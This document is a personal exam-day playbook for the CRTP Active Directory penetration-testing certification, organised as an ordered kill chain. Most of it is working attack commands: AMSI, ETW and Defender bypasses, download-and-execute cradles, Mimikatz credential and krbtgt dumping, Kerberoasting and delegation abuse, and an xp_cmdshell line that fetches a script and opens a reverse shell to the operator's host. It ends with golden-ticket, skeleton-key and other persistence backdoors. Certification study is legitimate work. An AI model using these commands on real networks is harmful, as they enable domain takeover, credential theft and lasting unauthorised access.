# CRTP — EXAM-DAY OPERATIONAL NOTES (MY PERSONAL COPY)

> My own notebook. Bypass first, enumerate hard, chain features, screenshot everything, report as I go.
> Placeholders: `<U>` user · `<D>` domain · `<DC>` domain controller FQDN · `<T>` target FQDN · `<IP>` my IP · `<SID>` domain SID · `<HASH>` NTLM/AES · `<SPN>` service principal name.
> LM placeholder: `aad3b435b51404eeaad3b435b51404ee`
> **GOLDEN RULE: AMSI/Defender bypass BEFORE importing any tool. Stock tooling dies. Obfuscate first.**
> **PROOF = screenshot `dir \\<T>\c$` (or any OS cmd output). No flags exist — the 5 machines ARE the flags.**

---

## 0. EXAM START — FIRST 15 MINUTES (do this in order)

```powershell
# Orient
whoami /all
hostname
ipconfig /all
nltest /dsgetdc:<D>
nltest /domain_trusts
klist
$ExecutionContext.SessionState.LanguageMode   # if 'Constrained' -> CLM, see §1
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections   # AppLocker?
```

- Use the **given foothold user**. Do NOT create my own (session issues waste time).
- Start **per-host notes**: IP / hostname / DC / trust / creds / technique-used / screenshot#.
- Serve my toolkit from my box via HTTP. Verify ≥3 transfer methods work (HTTP, SMB, base64 paste, netsh portproxy).
- **BloodHound first.** Then attacks.

---

## 1. BYPASS — DO THIS BEFORE ANY IMPORT (non-negotiable)

### AMSI bypass (apply, then retry if AMSI resets after re-import)
```powershell
# Obfuscated AMSI patch (one of several — keep 2-3 variants ready)
$s="69 6e 76 6f 6b 65"; $o=""; foreach($c in $s.Split(" ")){$o+=[char][convert]::ToInt16($c,16)};& $o('AmsiScanBuffer')  # placeholder — use a real obfuscated patch
```
```powershell
# SBLogging bypass (kill ETW via reflection)
[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('m_etwProvider','NonPublic,Instance').SetValue($null,$null)
```
```powershell
# Magic chain: AMSI + SBLogging together, then proceed
```

### Defender
```powershell
# ONLY if I can (needs admin) — prefer stealth instead
Set-MpPreference -DisableRealtimeMonitoring $true
# Better: test payload first with DefenderCheck, strip flagged strings with AMSITrigger
```

### CLM / AppLocker
```powershell
$ExecutionContext.SessionState.LanguageMode   # 'Full' = good; 'Constrained' = CLM
# CLM bypass: run from C:\Windows\System32\ or a Program Files dir (default-allowed paths)
cd C:\Windows\System32\
# AppLocker: .NET loaders / in-memory assemblies bypass it
# Loader "Blocked by group policy" -> modify script to load inline
```

### Renamed/obfuscated tools (pre-stage in ONE ZIP, serve via HTTP)
- `Invoke-Mimi.ps1` (renamed Mimikatz) — never `Invoke-Mimikatz`
- PowerView_dev (has `Set-DomainObject`, `Set-DomainRBCD`)
- SharpHound (**version matching my Neo4j/BloodHound**)
- Rubeus, Kekeo, Certify, PowerUpSQL, RACE, DAMP, PowerUp
- AMSITrigger, DefenderCheck, Invoke-Obfuscation
- `Invoke-PowerShellTcp.ps1`, Impacket, CrackMapExec, Snaffler

---

## 2. FILE TRANSFER / DELIVERY (have 3+ ready)

```powershell
# HTTP cradle
iex (iwr http://<IP>/PowerView_dev.ps1 -UseBasicParsing)
# Net.WebClient
(New-Object Net.WebClient).DownloadString('http://<IP>/x.ps1') | iex
# Copy to target via C$ (Program Files bypasses CLM)
Copy-Item .\Invoke-Mimi.ps1 \\<T>\c$\'Program Files\'
# base64 paste fallback
# netsh portproxy tunnel (for islanded targets)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<TARGETIP>
```

---

## 3. ENUMERATION — BLOODHOUND FIRST, THEN POWERVIEW

### BloodHound
```powershell
. .\sharphound.ps1
Invoke-BloodHound -CollectionMethod all -Verbose
# OPSEC: exclude DC
SharpHound.exe --CollectionMethods All --ExcludeDCs
# neo4j: install-service + start; GUI localhost:7474; bolt://localhost:7687
```
Prebuilt queries: Find All Domain Admins · Shortest Paths to DA · Kerberoastable Users · AS-REP Roastable · Unconstrained Delegation Systems · Constrained Delegation · RBCD paths.

### PowerView — domain/users/computers/groups
```powershell
. .\PowerView_dev.ps1
Get-NetDomain; Get-DomainSID; (Get-DomainPolicy)."System Access"; net accounts
Get-NetDomainController | select Name
Get-NetUser | select samaccountname, lastlogon, pwdlastset, memberof
Get-NetUser -Username <U>
Find-UserField -SearchField Description -SearchTerm "pass"   # creds hide in descriptions
Get-NetComputer -FullData | select samaccountname, operatingsystem, operatingsystemversion
```

### Groups & local admin & sessions (FIND DA SESSIONS)
```powershell
Get-NetGroup -GroupName *admin*
Get-NetGroupMember -GroupName "Domain Admins" -Recurse | select MemberName
Get-NetGroup -Username <U>
Get-NetLocalGroup -Computername <T> -ListGroups
Get-NetLocalGroup -Computername <T> -Recurse
Get-NetLoggedon -Computername <T>      # actively logged users
Get-LoggedonLocal -Computername <T>
Get-LastLoggedOn -ComputerName <T>
```

### Where am I admin? (lateral targets)
```powershell
Find-LocalAdminAccess -Verbose
. .\Find-WMILocalAdminAccess.ps1; Find-WMILocalAdminAccess
. .\Find-PSRemotingLocalAdminAccess.ps1; Find-PSRemotingLocalAdminAccess
Invoke-EnumerateLocalAdmin -Verbose
Invoke-UserHunter -GroupName "Domain Admins" -CheckAccess
Find-DomainUserLocation; Invoke-SessionHunter -NoPortScan -Targets <T>   # OPSEC flags
```

### Shares & files
```powershell
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
Invoke-FileFinder -Verbose
Get-NetFileServer
Invoke-HuntSMBShares; Snaffler
```

### GPO / OU
```powershell
Get-NetGPO; Get-NetGPO -Computername <T>
Get-NetGPOGroup     # restricted groups
Find-GPOComputerAdmin -Computername <T>
Find-GPOLocation -Username <U> -Verbose
Get-NetOU -FullData
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
```

### ACLs — FIND GenericAll/GenericWrite/WriteDACL/WriteOwner (attack paths)
```powershell
Get-ObjectACL -SamAccountName <acct> -ResolveGUIDS
Invoke-ACLScanner -ResolveGUIDs | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
Invoke-ACLScanner | Where-Object {$_.IdentityReference -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
Find-InterestingDomainAcl
```

### Trusts (cross-forest / enterprise path)
```powershell
Get-NetDomainTrust
Get-NetForest; Get-NetForestDomain; Get-NetForestCatalog
Get-NetForestTrust; Get-NetForestDomain -Verbose | Get-NetDomainTrust
```

### Delegation / Kerberoast / AS-REP / ADCS / SQL enum
```powershell
Get-NetUser -SPN | select samaccountname, serviceprincipalname
Get-DomainUser -PreauthNotRequired -Verbose
Get-NetComputer -UnConstrained | select samaccountname
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Certify.exe cas; Certify.exe find /vulnerable
Get-SQLInstanceDomain; Get-SQLConnectionTestThreaded
```

---

## 4. LOCAL PRIVILESC (low-priv → local admin)

```powershell
. .\powerup.ps1; Invoke-AllChecks       # or Privesc Invoke-PrivEsc / BeRoot / winPEAS
Get-ServiceUnquoted -Verbose
Get-ServiceModifiableServiceFile -Verbose
Invoke-ServiceAbuse -Name '<svc>' -UserName '<D>\<U>'
```
Techniques to try in order: service abuse (unquoted/modifiable) → AlwaysInstallElevated → Autorun → DLL hijack → **LAPS read** (`Get-ADObject -Filter * -Properties ms-Mcs-AdmPwd`; check ACLs on ms-Mcs-AdmPwd) → **Backup Operators** (`reg save HKLM\SAM sam.hiv`; `reg save HKLM\SYSTEM sys.hiv` → secretsdump) → AutoLogon registry creds → Firefox/browser mining → **Jenkins** job injection → NTLM relay / GPOddity.

**Add-user + RDP one-liner** (if I get local admin and want a stable shell):
```powershell
net user op Password123! /add; net localgroup Administrators op /add; net localgroup "Remote Desktop Users" op /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; netsh advfirewall firewall set rule group="Remote Desktop" new enable=Net
```

---

## 5. LATERAL MOVEMENT (local admin → boxes with DA sessions)

```powershell
# PSRemoting — use FQDN
Enter-PSSession -ComputerName <T>
$sess = New-PSSession -ComputerName <T>
Invoke-Command -ComputerName <T> -ScriptBlock {whoami}
Invoke-Command -ScriptBlock ${function:Get-NetLoggedon} -ComputerName (Get-Content targets.txt)
# winrs fallback
winrs -r:<T> cmd
# TrustedHosts for NTLM/PTH
Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
```
```python
# Impacket PSRemoting-equivalent with hash
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NTHASH> <D>/<U>@<T>
```

> If `winrs` fails → try `Enter-PSSession` and vice versa. PSRemoting needs **local admin** on target. WinRM uses machine-account SPN by default.

### Mimikatz cred dump (renamed Invoke-Mimi, from System32 for CLM)
```powershell
Invoke-Mimi -DumpCreds
Invoke-Mimi -DumpCreds -Computername @('s1','s2')
# SAM in-memory
Invoke-Mimi -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
# SAM via hives (Backup Ops)
reg save HKLM\SAM sam.hiv; reg save HKLM\SYSTEM sys.hiv
# offline: secretsdump -sam sam.hiv -system sys.hiv LOCAL  /  lsadump::sam sam.hiv sys.hiv
# LSA on DC (gets krbtgt)
Invoke-Mimi -Command '"lsadump::lsa /patch"' -Computername <DC>
# Credential vault
Invoke-Mimi -Command '"vault::cred /patch"'
```

### OverPass-the-Hash (PREFER — quieter than PtH; use AES256 to dodge MDI)
```powershell
# Rubeus asktgt with AES256
Rubeus.exe asktgt /user:<U> /aes256:<AES> /domain:<D> /ptt
# OR Mimikatz
Invoke-Mimi -Command '"sekurlsa::pth /user:<U> /domain:<D> /ntlm:<HASH> /run:powershell.exe"'
```
> PtH reuses NTLM (noisy). OPtH turns the hash into a TGT then proceeds normally — blends with domain traffic. AES > RC4 for OPSEC.

---

## 6. DOMAIN PRIVILEGE ESCALATION → DOMAIN ADMIN (the heart of CRTP)

### 6.1 Kerberoasting (target specific accounts, NOT all)
```powershell
Get-NetUser -SPN | select samaccountname, serviceprincipalname
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
Request-SPNTicket "<SPN>"
Invoke-Mimi -Command '"Kerberos::list /export"'
# crack
hashcat -m 13100 hashes.txt rockyou.txt   # RC4 TGS; AES256 = -m 19700
```

### 6.2 AS-REP Roasting
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
Invoke-ASREPRoast -Verbose
Get-ASREPHash -Username <U> -Verbose
# FORCE disable preauth if I have GenericAll/GenericWrite
Set-DomainObject -Identity <U> -XOR @{useraccountcontrol=4194304} -Verbose
# crack: insert '23' after $krb5asrep$  -> hashcat -m 18200 hash.txt rockyou.txt
```

### 6.3 Targeted Kerberoasting (Set SPN — need GenericAll/GenericWrite)
```powershell
Get-DomainUser -Identity <U> | select samaccountname, serviceprincipalname
Set-DomainObject -Identity <U> -Set @{serviceprincipalname='ops/whatever1'}
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
Invoke-Mimi -Command '"Kerberos::list /export"'
Get-DomainUser -Identity <U> | Get-DomainSPNTicket | select -ExpandProperty Hash
# hashcat -m 13100  (then REMOVE the SPN to clean up)
```

### 6.4 Unconstrained Delegation (+ PrinterBug to coerce DC → steal DA TGT)
```powershell
Get-NetComputer -UnConstrained | select samaccountname
# get local admin on the unconstrained box, then monitor
Rubeus.exe monitor /interval:5
# force DC auth (PrinterBug / MS-RPRN)
MS-RPRN.exe \\<DC> \\<UNCONSTRAINED-BOX>
Invoke-Mimi -Command '"sekurlsa::tickets /export"'
Invoke-Mimi -Command '"kerberos::ptt <stolenDA.kirbi>"'   # now DA
```

### 6.5 Constrained Delegation (S4U — protocol transition)
```powershell
# Enumerate (done in §3). Compromise first hop, then:
# User-based (Kekeo)
tgt::ask /user:<U> /domain:<D> /rc4:<HASH>
tgs::s4u /tgt:<tgt> /user:Administrator@<D> /service:cifs/<T>
Invoke-Mimi -Command '"kerberos::ptt <kirbi>"'
# Computer-based — no SPN validation, use time/ldap for DCSync
tgt::ask /user:<PC>$ /domain:<D> /rc4:<HASH>
tgs::s4u /tgt:<tgt> /user:Administrator@<D> /service:time/<T>|ldap/<T>
Invoke-Mimi -Command '"kerberos::ptt <kirbi>"'
Invoke-Mimi -Command '"lsadump::dcsync /user:<D>\krbtgt"'
# Rubeus alt-service to expand to HOST/HTTP/RPCSS
Rubeus.exe s4u /user:<U> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<T> /altservice:host /ptt
```

### 6.6 RBCD (need GenericAll/GenericWrite on a COMPUTER)
```powershell
Set-DomainRBCD -Identity <TARGET-PC> -DelegateFrom <MY-PC>$   # or Set-ADComputer -PrincipalsAllowedToDelegateToAccount
# extract my machine account hash, then s4u as anyone to <TARGET-PC>
Rubeus.exe s4u /user:<MY-PC>$ /rc4:<MACHASH> /impersonateuser:Administrator /msdsspn:host/<TARGET-PC> /ptt
```

### 6.7 DNSAdmins (load DLL on DC's DNS service — usually a DC)
```powershell
Get-NetGroupMember "DNSAdmins"
dnscmd <DC> /config /serverlevelplugindll \\<IP>\share\mimilib.dll
sc \\<DC> stop dns; sc \\<DC> start dns   # code runs as SYSTEM on DC
```

### 6.8 SQL linked-server crawl (cross-forest exec) — PowerUpSQL
```powershell
. .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Get-SQLServerLink -Instance <inst> -Verbose
Get-SQLServerLinkCrawl -Instance <inst> -Verbose
# enable xp_cmdshell on a hop
Execute('sp_configure "xp_cmdshell",1;reconfigure;') AT "<inst>"
Get-SQLServerLinkCrawl -Instance <inst> -Query "exec master..xp_cmdshell 'whoami'"
Get-SQLServerLinkCrawl -Instance <inst> -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress <IP> -Port 4000'"
```

### 6.9 ACL-based DA — grant myself DCSync rights
```powershell
Add-DomainObjectAcl -TargetDistinguishedName 'DC=<D>,DC=...' -PrincipalSamAccountName <U> -Rights DCSync -Verbose
# then DCSync krbtgt (ON THE DC to dodge MDI)
Invoke-Mimi -Command '"lsadump::dcsync /user:<D>\krbtgt"' -Computername <DC>
```
Other ACL wins: GenericAll → reset password (`Set-DomainUserPassword`) / add SPN / flip userAccountControl. WriteDACL → grant DCSync. WriteOwner → own then grant.

### 6.10 DCSync (THE win condition for DA) — run ON the DC
```powershell
# Move to the DC first (via PSRemoting once I'm local admin there), then:
Invoke-Mimi -Command '"lsadump::dcsync /user:<D>\krbtgt"'          # krbtgt for tickets
Invoke-Mimi -Command '"lsadump::dcsync /user:<D>\Administrator"'   # DA hash directly
```
> **MDI flags DCSync from non-DCs. Run it ON the DC.** Use AES keys.

---

## 7. CROSS-TRUST → ENTERPRISE ADMIN (child DA → forest root)

### 7.1 Trust key path
```powershell
Invoke-Mimi -Command '"lsadump::trust /patch"' -Computername <DC>           # trust keys
# alt: lsadump::dcsync /user:<D>\<CHILD>$
# get parent EA SID
Get-NetGroup -Domain <PARENT> -GroupName "Enterprise Admins" -FullData | select objectsid
# forge inter-realm TGT with EA SID
Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:<CHILD> /sid:<CHILDSID> /sids:<EA-SID> /rc4:<TRUSTHASH> /service:krbtgt /target:<PARENT> /ticket:<path>"'
./asktgs.exe <kirbi> CIFS/<PARENTDC>
./kirbikator.exe lsa .\<kirbi>
ls \\<PARENTDC>\c$   # PROOF
```

### 7.2 krbtgt path (as child DA — SID history injection)
```powershell
Invoke-Mimi -Command '"lsadump::lsa /patch"' -Computername <DC>   # child krbtgt
Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:<CHILD> /sid:<CHILDSID> /sids:<EA-SID> /krbtgt:<KRBGTGHASH> /ticket:<path>"'
Invoke-Mimi -Command '"kerberos::ptt <path>"'
```

### 7.3 As child DC (DCORP-DC$ golden + parent DCSync)
```powershell
# forge golden for <CHILDDC>$ with DC group SID + EA SID
# DCSync parent krbtgt, then forge parent golden, winrs to parent DC
```

> **Cannot use asktgt across realms.** Forge inter-realm ticket with the **trust key**, specify **parent SID and domain**.

---

## 8. ADCS (ESC1–ESC8) — frequently in CRTP now
```powershell
Certify.exe cas
Certify.exe find /vulnerable
# ESC1: template allows SAN, low-priv can enroll -> request cert as Administrator
Certify.exe request /ca:<CA> /template:<TEMPLATE> /altname:Administrator
# turn cert into TGT
Rubeus.exe asktgt /user:Administrator /certificate:<pfx> /password:<pfxpass> /domain:<D> /ptt
```
ESC8 = NTLM relay to HTTP Web Enrollment endpoint. Map each ESC to its ACL/misconfig prerequisite.

---

## 9. PERSISTENCE / DOMINANCE (post-DA — for the report, last on each chain)

| Tech | Requires | Command |
|------|----------|---------|
| **Golden** | krbtgt+SID | `kerberos::golden /user:Administrator /domain:<D> /sid:<SID> /krbtgt:<HASH> /id:500 /groups:512 /ptt` |
| **Silver** | svc/comp hash+SPN | `kerberos::golden ... /target:<T> /service:CIFS /rc4:<HASH> /ptt` (HOST=schtasks; HOST+RPCSS=WMI; HTTP=WinRM). Impersonated user MUST have rights to target service. |
| **Diamond** | krbtgt | `Rubeus.exe diamond /tgtdeleg /user:Administrator /domain:<D> /sid:<SID> /krbtgt:<HASH> /ptt` (modifies legit TGT — OPSEC) |
| **Skeleton Key** | DA | `misc::skeleton` on DC → login as anyone w/ `mimikatz` (may fail in lab — know conceptually) |
| **DSRM** | DA+DSRM hash | `token::elevate` `lsadump::sam` → set `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior=2` → PTH DSRM admin |
| **Custom SSP** | DA | `misc::memssp` → creds log to `C:\Windows\System32\kiwissp.log` |
| **AdminSDHolder** | DA | `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName <U> -Rights All`; `Invoke-SDPropagator -showProgress -timeoutMinutes 1`; then add to DA |
| **DCSync rights** | DA | `Add-DomainObjectAcl -TargetDistinguishedName 'DC=...' -Rights DCSync` (forever-rights) |
| **WMI SD** | DA on DC | `Set-RemoteWMI -Username <U> -Verbose` (RACE) |
| **PSRemoting SD** | DA on DC | `Set-RemotePSRemoting -Username <U> -Verbose` (RACE) |
| **Remote reg (DAMP)** | DA on DC | `Add-RemoteRegBackdoor -Computername <T> -Trustee <U>`; later `Get-RemoteMachineAccountHash` / `Get-RemoteLocalAccountHash` / `Get-RemoteCachedCredential` |

---

## 10. ERROR BANK (don't panic — these mean known things)

| Symptom | Cause / Fix |
|--------|-------------|
| `Enter-PSSession: Access is denied` | bad/missing ticket; check Kerberos; WinRM firewall/subnet |
| `winrs: Access is denied` | no ticket or no local admin on target |
| `winrs: logon session terminated` | wrong hash or SPN mismatch |
| `KRB_AP_ERR_BAD_INTEGRITY` / `KRB_AP_ERR_PREAUTH_FAILED` | wrong hash/keys |
| `Invoke-Mimi: Cannot create type` | CLM — run from `C:\Windows\System32\` or Program Files |
| `Loader: Blocked by group policy` | CLM/AppLocker — modify script to load inline |
| `Set-RemotePSRemoting: I/O operation aborted` | **IGNORE — means success** |
| MCORP: asktgt fails across realms | must forge inter-realm ticket w/ trust key + parent SID/domain |
| Tools caught by Defender/AMSI | re-apply bypass, use obfuscated/renamed build, .NET loader |

---

## 11. OPSEC REFRESHER (quiet = survive the clock)
- AMSI/Defender bypass BEFORE every tool import. Re-apply if AMSI resets after re-import.
- **DCSync ON the DC** (not remote) → MDI won't flag.
- **AES256 > RC4/NTLM** for OPtH/tickets → blends with normal domain traffic.
- `SharpHound --ExcludeDCs`; `Invoke-SessionHunter -NoPortScan -Targets <T>`.
- **Don't Kerberoast everyone** — target specific SPN accounts.
- Run Mimikatz variants from `System32` to dodge CLM.
- Prefer in-memory/.NET loaders over dropping binaries to disk.
- Timebox each technique — rabbit holes fail people. Stuck → restart the box, take a break, re-enumerate.

---

## 12. MY KILL-CHAIN ORDER ON EXAM DAY
1. Foothold user → §1 bypass → §3 BloodHound+PowerView enum.
2. §4 local privesc → local admin on foothold → dump creds (§5).
3. Find DA session / where-I'm-admin → §5 lateral → land on box w/ DA creds.
4. §6 → Domain Admin (Kerberoast/AS-REP/Delegation/RBCD/DNSAdmins/SQL/ACl→DCSync/ADCS).
5. §7 → Enterprise Admin via trust key or krbtgt SID-history (if a trust hop needed).
6. RCE on remaining boxes; `dir \\<T>\c$` screenshot = PROOF on each.
7. §9 persistence (for the report).
8. **Report as I go** (screenshots + why-each-command, within the 24h window).

---

## 13. REPORT (second pass gate — weak report FAILS a 5-RCE exam)
Narrative, not pentest-style. Explain **WHY** each command worked + how I found the values I fed in + cited mitigations.
1. Title page · 2. TOC · 3. Executive Summary (scenario = insider sim from compromised domain-joined box; scope; methodology) · 4. Methodology & Goals (kill-chain alignment) · 5. Attack Narrative (per-machine: access→privesc→lateral, screenshots + why) · 6. Remediation (per-target + general, cite OSS tools/talks/blogs) · 7. References · 8. Tools.
Template: SysReptor / PwnDoc / pentestreports.com. Write it DURING the window while lab is live.

---

## REMINDERS I TAPE TO THE MONITOR
- Map first. BloodHound first. Always.
- Bypass before import. Every time.
- Proof = screenshot of OS cmd output on each of the 5 boxes.
- The report is a pass gate. Explain WHY.
- 24h is generous. Don't rush. Don't rabbit-hole. Re-enumerate when stuck.
- Run DCSync on the DC. Use AES. Don't Kerberoast everyone.